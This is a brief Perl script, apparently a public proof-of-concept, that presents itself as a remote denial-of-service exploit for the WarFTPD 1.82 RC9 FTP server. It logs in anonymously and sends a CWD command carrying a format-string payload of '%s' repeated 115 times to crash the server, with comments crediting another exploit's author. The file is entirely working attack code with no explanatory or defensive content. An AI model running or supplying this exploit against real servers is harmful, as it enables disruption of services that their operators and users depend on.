#!/usr/bin/perl -w
# remote DoS PoC Exploit for WarFTPD 1.82 RC9
# THX 2 barabas 4 his GoldenFTP-sploit :)
# greetings fly out to Foobar

use strict;
use Net::FTP;
my $payload="%s"x115;

my $ftp = Net::FTP->new("127.0.0.1", Debug => 1);
$ftp->login("anonymous","123@123.com");
$ftp->quot("CWD",$payload);

